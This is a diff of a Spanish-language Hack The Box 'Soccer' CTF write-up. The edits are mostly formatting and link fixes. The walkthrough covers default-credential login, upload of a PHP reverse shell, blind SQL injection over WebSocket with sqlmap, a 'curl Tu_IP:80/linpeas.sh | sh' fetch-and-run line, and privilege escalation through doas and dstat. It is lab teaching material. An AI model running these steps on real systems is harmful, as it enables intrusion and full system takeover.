@@ -1,7 +1,7 @@
 ---
 layout: single
 title: Soccer - Hack The Box
-excerpt: "Una máquina que deberia ser de dificultad media porque fácil no fue, lo que hicimos fue registrar la página del servicio HTTP en el /etc/hosts, luego vamos a utilizar Fuzzing para descubrir un login, que nos muestra el servicio Tiny File Manager. Accederemos usando las credenciales por defecto de este servicio y cargaremos una Reverse Shell hecha en PHP en la carpeta Uploads del servicio para poder conectarnos de manera remota a la máquina. Dentro buscaremos el directorio del servicio Nginx para descubrir una subpágina, la cual nos permitirá crear un usuario y loguearnos en ella, dentro de esta subpágina encontraremos en el código fuente que usa un Web Socket, usaremos el ataque Blind SQL Injection para capturar las credenciales del usuario de la máquina. Una vez dentro de la máquina, usaremos la herramienta linpeas.sh para descubrir una forma de escalar privilegios, siendo que usaremos el programa Doas para que active un script que nosotros haremos que cambiara los privilegios de la Bash, para que cuando nos conectemos ahí, sea como Root."
+excerpt: "Una máquina que debería ser de dificultad media porque fácil no fue, lo que hicimos fue registrar la página del servicio HTTP en el /etc/hosts, luego vamos a utilizar Fuzzing para descubrir un login, que nos muestra el servicio Tiny File Manager. Accederemos usando las credenciales por defecto de este servicio y cargaremos una Reverse Shell hecha en PHP en la carpeta Uploads del servicio para poder conectarnos de manera remota a la máquina. Dentro buscaremos el directorio del servicio Nginx para descubrir una subpágina, la cual nos permitirá crear un usuario y loguearnos en ella, dentro de esta subpágina encontraremos en el código fuente que usa un Web Socket, usaremos el ataque Blind SQL Injection para capturar las credenciales del usuario de la máquina. Una vez dentro de la máquina, usaremos la herramienta linpeas.sh para descubrir una forma de escalar privilegios, siendo que usaremos el programa Doas para que active un script que nosotros haremos que cambiara los privilegios de la Bash, para que cuando nos conectemos ahí, sea como Root."
 date: 2023-04-12
 classes: wide
 header:
@@ -20,15 +20,16 @@ tags:
   - Nginx
   - Web Socket Exploit
   - Blind SQL Injection
-  - LinPEAS
-  - Doas.conf Privilege Escalation
+  - System Recognition (Linux)
+  - Privesc - Doas.conf Privilege Escalation
   - OSCP Style
 ---
 ![](/assets/images/htb-writeup-soccer/soccer_logo.png)
 
-Una máquina que deberia ser de dificultad media porque fácil no fue, lo que hicimos fue registrar la página del **servicio HTTP** en el **/etc/hosts**, luego vamos a utilizar **Fuzzing** para descubrir un login, que nos muestra el servicio **Tiny File Manager**. Accederemos usando las credenciales por defecto de este servicio y cargaremos una Reverse Shell hecha en PHP en la carpeta **Uploads** del servicio para poder conectarnos de manera remota a la máquina. Dentro buscaremos el directorio del servicio **Nginx** para descubrir una subpágina, la cual nos permitirá crear un usuario y loguearnos en ella, dentro de esta subpágina encontraremos en el código fuente que usa un **Web Socket**, usaremos el ataque **Blind SQL Injection** para capturar las credenciales del usuario de la máquina. Una vez dentro de la máquina, usaremos la herramienta **linpeas.sh** para descubrir una forma de escalar privilegios, siendo que usaremos el programa **Doas** para que active un script que nosotros haremos que cambiara los privilegios de la **Bash**, para que cuando nos conectemos ahí, sea como **Root**.
+Una máquina que debería ser de dificultad media porque fácil no fue, lo que hicimos fue registrar la página del **servicio HTTP** en el **/etc/hosts**, luego vamos a utilizar **Fuzzing** para descubrir un login, que nos muestra el servicio **Tiny File Manager**. Accederemos usando las credenciales por defecto de este servicio y cargaremos una Reverse Shell hecha en PHP en la carpeta **Uploads** del servicio para poder conectarnos de manera remota a la máquina. Dentro buscaremos el directorio del servicio **Nginx** para descubrir una subpágina, la cual nos permitirá crear un usuario y loguearnos en ella, dentro de esta subpágina encontraremos en el código fuente que usa un **Web Socket**, usaremos el ataque **Blind SQL Injection** para capturar las credenciales del usuario de la máquina. Una vez dentro de la máquina, usaremos la herramienta **linpeas.sh** para descubrir una forma de escalar privilegios, siendo que usaremos el programa **Doas** para que active un script que nosotros haremos que cambiara los privilegios de la **Bash**, para que cuando nos conectemos ahí, sea como **Root**.
 
 Herramientas utilizadas:
+* *ping*
 * *nmap*
 * *wappalizer*
 * *whatweb*
@@ -89,10 +90,7 @@ Herramientas utilizadas:
 <br>
 <hr>
 <div style="position: relative;">
- <h1 id="Recopilacion" style="text-align:center;">Recopilación de Información</h1>
-  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
-   <a href="#Indice">Volver al Índice</a>
-  </button>
+	<h1 id="Recopilacion" style="text-align:center;">Recopilación de Información</h1>
 </div>
 <br>
 
@@ -189,10 +187,7 @@ Vaya, vaya, la máquina está usando **nginx 1.18.0** cómo en la **máquina Pre
 <br>
 <hr>
 <div style="position: relative;">
- <h1 id="Analisis" style="text-align:center;">Análisis de Vulnerabilidades</h1>
-  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
-   <a href="#Indice">Volver al Índice</a>
-  </button>
+	<h1 id="Analisis" style="text-align:center;">Análisis de Vulnerabilidades</h1>
 </div>
 <br>
 
@@ -239,20 +234,7 @@ Total requests: 220560
 ID           Response   Lines    Word       Chars       Payload                                                               
 =====================================================================
 
-000000001:   200        147 L    526 W      6917 Ch     "# directory-list-2.3-medium.txt"                                     
-000000003:   200        147 L    526 W      6917 Ch     "# Copyright 2007 James Fisher"                                       
-000000007:   200        147 L    526 W      6917 Ch     "# license, visit http://creativecommons.org/licenses/by-sa/3.0/"     
 000000014:   200        147 L    526 W      6917 Ch     "http://soccer.htb//"                                                 
-000000012:   200        147 L    526 W      6917 Ch     "# on atleast 2 different hosts"                                      
-000000010:   200        147 L    526 W      6917 Ch     "#"                                                                   
-000000011:   200        147 L    526 W      6917 Ch     "# Priority ordered case sensative list, where entries were found"    
-000000013:   200        147 L    526 W      6917 Ch     "#"                                                                   
-000000009:   200        147 L    526 W      6917 Ch     "# Suite 300, San Francisco, California, 94105, USA."                 
-000000006:   200        147 L    526 W      6917 Ch     "# Attribution-Share Alike 3.0 License. To view a copy of this"       
-000000008:   200        147 L    526 W      6917 Ch     "# or send a letter to Creative Commons, 171 Second Street,"          
-000000005:   200        147 L    526 W      6917 Ch     "# This work is licensed under the Creative Commons"                  
-000000002:   200        147 L    526 W      6917 Ch     "#"                                                                   
-000000004:   200        147 L    526 W      6917 Ch     "#"                                                                   
 000008034:   200        96 L     1750 W     11521 Ch    "tiny"                                                                
 000045240:   200        147 L    526 W      6917 Ch     "http://soccer.htb//"                                                 
 
@@ -286,7 +268,7 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 [+] User Agent:              gobuster/3.5
 [+] Timeout:                 10s
 ===============================================================
-2024/07/10 11:10:58 Starting gobuster in directory enumeration mode
+Starting gobuster in directory enumeration mode
 ===============================================================
 /tiny                 (Status: 301) [Size: 178] [--> http://soccer.htb/tiny/]
 ```
@@ -314,13 +296,15 @@ Veamos que es este servicio:
 |:-----------:|
 | *Administrador de archivos basado en la web en PHP, administre sus archivos de manera eficiente y fácil con Tiny File Manager, es un administrador de archivos simple, rápido y pequeño con un solo archivo.*|
 
+<br>
+
 Bueno, en resumen es un administrador de archivos en PHP, aquí más información:
-* https://tinyfilemanager.github.io/
+* <a href="https://tinyfilemanager.github.io/" target="_blank">Tiny File Manager</a>
 
 Entonces, supongo que tendrá credenciales por defecto, busquémoslas. 
 
 Aquí están:
-* https://elements.heroku.com/buttons/skmdimtiaj/tinyfilemanager
+* <a href="https://exploit-notes.hdks.org/exploit/web/tiny-file-manager-pentesting/" target="_blank">Tiny File Manager Pentesting</a>
 
 Las credenciales por defecto son:
 
@@ -331,17 +315,14 @@ Probemos primero las del admin, ponlas en el login y trata de entrar:
 
 ![](/assets/images/htb-writeup-soccer/Captura4.png)
 
-a...Bueno, pudimos entrar ya como administrador, ya podemos ver una versión del servicio **Tiny** que es la 2.4.3. Es momento de buscar un Exploit.
+a...Bueno, pudimos entrar ya como administrador, ya podemos ver una versión del servicio **Tiny** que es la **versión 2.4.3**. Es momento de buscar un Exploit.
 
 
 <br>
 <br>
 <hr>
 <div style="position: relative;">
- <h1 id="Explotacion" style="text-align:center;">Explotación de Vulnerabilidades</h1>
-  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
-   <a href="#Indice">Volver al Índice</a>
-  </button>
+	<h1 id="Explotacion" style="text-align:center;">Explotación de Vulnerabilidades</h1>
 </div>
 <br>
 
@@ -377,7 +358,7 @@ File Type: Unicode text, UTF-8 text
 Según el Exploit, también puede funcionar con la **versión 2.4.3**, pero mejor busquemos por internet uno que sea específico para esta versión.
 
 Encontré uno, incluso aquí está el Exploit para la **versión 2.4.6**:
-* https://github.com/febinrev/tinyfilemanager-2.4.3-exploit
+* <a href="https://github.com/febinrev/tinyfilemanager-2.4.3-exploit" target="_blank">Repositorio de febinrev: CVE-2021-45010 - Tiny File Manager-2.4.3 exploit</a>
 
 ----
 
@@ -392,7 +373,7 @@ En dicha carpeta solo acepta archivos **.php** y solo de manera temporal, es dec
 <h2 id="PruebaExp2">Cargando Reverse Shell de PHP en Servicio Tiny File Manager</h2>
 
 Dejando a un lado los Exploits, lo que podemos hacer es cargar un payload malicioso hecho en **PHP** para así poder conectarnos de manera remota. Para esto, usaremos el siguiente link de **PentestMonkey**:
-* https://github.com/pentestmonkey/php-reverse-shell
+* <a href="https://github.com/pentestmonkey/php-reverse-shell" target="_blank">Repositorio de pentestmonkey: php-reverse-shell</a>
 
 Vamos a descargar solamente el script:
 * Obten el código del script solo dando en la opción de raw.
@@ -405,7 +386,7 @@ Petición HTTP enviada, esperando respuesta... 200 OK
 Longitud: 5491 (5.4K) [text/plain]
 Grabando a: «php-reverse-shell.php»
 *
-php-reverse-shell.php  100%[=======================================================================================================================================>]   5.36K  --.-KB/s    en 0s      
+php-reverse-shell.php  100%[=============================================================>]   5.36K  --.-KB/s    en 0s      
 *
 (73.3 MB/s) - «php-reverse-shell.php» guardado [5491/5491]
 ```
@@ -449,7 +430,7 @@ listening on [any] 443 ...
 ```bash
 nc -nvlp 443                                                    
 listening on [any] 443 ...
-connect to [10.10.14.16] from (UNKNOWN) [10.10.11.194] 41962
+connect to [Tu_IP] from (UNKNOWN) [10.10.11.194] 41962
 Linux soccer 5.4.0-135-generic #152-Ubuntu SMP Wed Nov 23 20:19:22 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
  19:03:20 up  2:31,  0 users,  load average: 0.00, 0.00, 0.00
 USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
@@ -466,7 +447,7 @@ Ahora no importa si el archivo se elimina, nosotros seguiremos conectados. Vamos
 
 Recuerda que esta activo un **servicio Nginx**, este es el que podemos enumerar para encontrar algo útil.
 
----
+-----
 
 Bien, no podremos hacer muchas cosas, pues no somos un usuario como tal con privilegios de la máquina, sino que somos un usuario del servicio web **Tiny File Manager**, por lo que entrar al directorio del **usuario Player** para ver la flag, será inútil.
 
@@ -649,9 +630,9 @@ Y mira, hay algo curioso. La página está usando un **Web Socket** que se conec
 
 Si buscamos un Exploit para el **Web Socket**, encontraremos el siguiente blog:
 
-* https://rayhan0x01.github.io/ctf/2021/04/02/blind-sqli-over-websocket-automation.html
+* <a href="https://rayhan0x01.github.io/ctf/2021/04/02/blind-sqli-over-websocket-automation.html" target="_blank">Automating Blind SQL injection over WebSocket</a>
 
-En resumen, lo que haremos será redirigir la data que se está transmitiendo de la subpágina hacia nosotros, utilizando un script en Python y que usara **SQL Map** para capturar información crítica. Esto se puede hacer, justamente porque la data se transmite por el **Web Socket** más no cómo en el servicio HTTP, esto lo explica en el blog, es muy interesante, así que te recomiendo leerlo atentamente. Hagamos por pasos la captura, por cierto a esto se le llama **Blind SQL Injection**.
+En resumen, lo que haremos será redirigir la data que se está transmitiendo de la subpágina hacia nosotros, utilizando un script en **Python** y que usara **SQLMap** para capturar información crítica. Esto se puede hacer, justamente porque la data se transmite por el **Web Socket** más no cómo en el servicio HTTP, esto lo explica en el blog, es muy interesante, así que te recomiendo leerlo atentamente. Hagamos por pasos la captura, por cierto a esto se le llama **Blind SQL Injection**.
 
 | **Blind SQL Injection** |
 |:-----------:|
@@ -693,9 +674,9 @@ Enter password: xd
 ERROR 1045 (28000): Access denied for user 'www-data'@'localhost' (using password: YES)
 ```
 
-Excelente, ya sabemos que esta activo el **servicio MySQL**. Ahora, ¿donde vamos a aplicar la **inyección SQL**? De acuerdo al script que esta usando el **Web Socket**, esta obteniendo el Id de cada ticket que se esta haciendo, vamos a comprobar si este campo es vulnerable a una inyección SQL.
+Excelente, ya sabemos que esta activo el **servicio MySQL**. Ahora, ¿donde vamos a aplicar la **inyección SQL**? De acuerdo al script que esta usando el **Web Socket**, esta obteniendo el Id de cada ticket que se esta haciendo, vamos a comprobar si este campo es vulnerable a una **inyección SQL**.
 
-* Primero abre BurpSuite:
+* Primero abre **BurpSuite**:
 ```bash
 burpsuite &> /dev/null & disown
 ```
@@ -707,13 +688,13 @@ burpsuite &> /dev/null & disown
 </p>
 
 
-* Si observas el resultado que marca BurpSuite, al parecer el número de Id no existe:
+* Si observas el resultado que marca **BurpSuite**, al parecer el número de Id no existe:
 
 <p align="center">
 <img src="/assets/images/htb-writeup-soccer/Captura18.png">
 </p>
 
-* Vamos a meter la inyección aquí, dentro de los parentesis vamos a utilizar la inyección básica con la que podemos identificar si es vulnerable a una inyección SQL:
+* Vamos a meter la inyección aquí, dentro de los parentesis vamos a utilizar la inyección básica con la que podemos identificar si es vulnerable a una **inyección SQL**:
 ```bash
 id: "1 OR 1=1-- -"
 ```
@@ -722,7 +703,7 @@ id: "1 OR 1=1-- -"
 <img src="/assets/images/htb-writeup-soccer/Captura19.png">
 </p>
 
-Con esto comprobamos que si es vulnerable a una inyección SQL, es posible que podamos listar información, pero eso ya lo dejo para que lo practiques. Vamos a aprovecharnos de esto y utilizaremos el blog para ver que podemos dumpear de la BD con **SQLMAP**.
+Con esto comprobamos que si es vulnerable a una **inyección SQL**, es posible que podamos listar información, pero eso ya lo dejo para que lo practiques. Vamos a aprovecharnos de esto y utilizaremos el blog para ver que podemos dumpear de la BD con **SQLMAP**.
 
 Yo voy a copiar el script que viene ahí y lo llamaré **Sqlmap_Exploit.py** y en otra terminal, tendré listo el siguiente comando:
 ```bash
@@ -849,10 +830,7 @@ Muy bien, ahora veamos como podemos escalar privilegios.
 <br>
 <hr>
 <div style="position: relative;">
- <h1 id="Post" style="text-align:center;">Post Explotación</h1>
-  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
-   <a href="#Indice">Volver al Índice</a>
-  </button>
+	<h1 id="Post" style="text-align:center;">Post Explotación</h1>
 </div>
 <br>
 
@@ -869,10 +847,10 @@ Sorry, user player may not run sudo on localhost.
 No podremos hacer mucho, así que vamos a usar una herramienta útil llamada **Linpeas** que es parte de las herramientas **PEASS-ng**, estas son herramientas que pueden mostrar vulnerabilidades en una máquina, algo así cómo el **Windows Exploit Suggester**, pero este sirve para los principales sistemas operativos.
 
 Aquí puedes descargar el **linpeas.sh**, solo dale click y te lo descarga:
-* https://github.com/carlospolop/PEASS-ng/releases/tag/20230409
+* <a href="https://github.com/carlospolop/PEASS-ng/releases/tag/20230409" target="_blank">Repositorio de carlospolop: PEASS-ng Releases</a>
 
 Bien, ahora, como lo indica el **LinPEAS**, que viene aquí:
-* https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS
+* <a href="https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS" target="_blank">Repositorio de carlospolop: PEASS-ng linPEAS</a>
 
 Vamos a levantar un servidor para poder usar el **linpeas.sh**:
 ```bash
@@ -882,7 +860,7 @@ Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 
 Y dentro de la máquina víctima, usaremos **curl** para poder usarlo:
 ```bash
-player@soccer:~$ curl 10.10.14.16:80/linpeas.sh | sh
+player@soccer:~$ curl Tu_IP:80/linpeas.sh | sh
   % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                  Dload  Upload   Total   Spent    Left  Speed
   0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0
@@ -894,6 +872,7 @@ Poco a poco, nos dirá que vulnerabilidades tiene, pero hay una que nos va a ser
 ╔══════════╣ Checking doas.conf
 permit nopass player as root cmd /usr/bin/dstat
 ```
+
 ¿Qué es eso del **doas.conf**?
 
 | **doas.conf** |
@@ -911,10 +890,10 @@ player@soccer:~$ find / -type d -name dstat 2>/dev/null
 ```
 
 Excelente, si buscamos por **GTFObins**, encontramos que dentro del directorio **/usr/local/share/dstat**, es donde podemos hacer un archivo que nos dará privilegios:
-* https://gtfobins.github.io/gtfobins/dstat/
+* <a href="https://gtfobins.github.io/gtfobins/dstat/" target="_blank">GTFOBins: dstat</a>
 
 Lo que vamos a hacer, será crear un archivo en **Python** que cambie los permisos de la **Bash** para que cualquiera pueda ser **Root**, justo como lo indica el siguiente blog, de aquí saque la forma de buscar el **dstat**, un excelente blog con buenas notas, guárdenlo para el futuro:
-* https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudo-dstat-privilege-escalation/
+* <a href="https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudo-dstat-privilege-escalation/" target="_blank">Sudo Dstat Privilege Escalation</a>
 
 Hagamos el script:
 ```bash
@@ -935,7 +914,7 @@ player@soccer:/usr/local/share/dstat$ ls -la /bin/bash
 ```
 
 Ahora activemos el script, pero **CUIDADO**, recuerda que no tenemos permisos como **SUDO**, así que no lo uses. Usaremos el comando **doas**, como lo menciona el mismo blog, pero en otro caso:
-* https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/doas/
+* <a href="https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/doas/" target="_blank">Doas Privilege Escalation</a>
 
 Activemos el script:
 ```bash
@@ -965,11 +944,9 @@ bash-5.0# cat root.txt
 <br>
 <br>
 <div style="position: relative;">
- <h2 id="Links" style="text-align:center;">Links de Investigación</h2>
-  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
-   <a href="#Indice">Volver al Índice</a>
-  </button>
+	<h2 id="Links" style="text-align:center;">Links de Investigación</h2>
 </div>
+
 
 * https://github.com/febinrev/tinyfilemanager-2.4.3-exploit
 * https://github.com/pentestmonkey/php-reverse-shell
@@ -987,3 +964,48 @@ bash-5.0# cat root.txt
 
 <br>
 # FIN
+
+<footer id="myFooter">
+    <!-- Footer para eliminar el botón -->
+</footer>
+
+<style>
+        #backToIndex {
+                display: none;
+                position: fixed;
+                left: 87%;
+                top: 90%;
+                z-index: 2000;
+                background-color: #81fbf9;
+                border-radius: 10px;
+                border: none;
+                padding: 4px 6px;
+                cursor: pointer;
+        }
+</style>
+
+<a id="backToIndex" href="#Indice">
+        <img src="/assets/images/arrow-up.png" style="width: 45px; height: 45px;">
+</a>
+
+<script>
+    window.onscroll = function() { showButton() };
+
+    function showButton() {
+        const scrollPosition = document.documentElement.scrollTop || document.body.scrollTop;
+        const indicePosition = document.getElementById("Indice").offsetTop;
+        const footerPosition = document.getElementById("myFooter").offsetTop;
+        const windowHeight = window.innerHeight;
+
+        const button = document.getElementById("backToIndex");
+
+        // Mostrar el botón si el usuario ha bajado al índice
+        if (scrollPosition >= indicePosition && (scrollPosition + windowHeight) < footerPosition) {
+            button.style.display = "block";
+            button.style.position = "fixed";
+            button.style.top = "90%";
+        } else {
+            button.style.display = "none";
+        }
+    }
+</script>
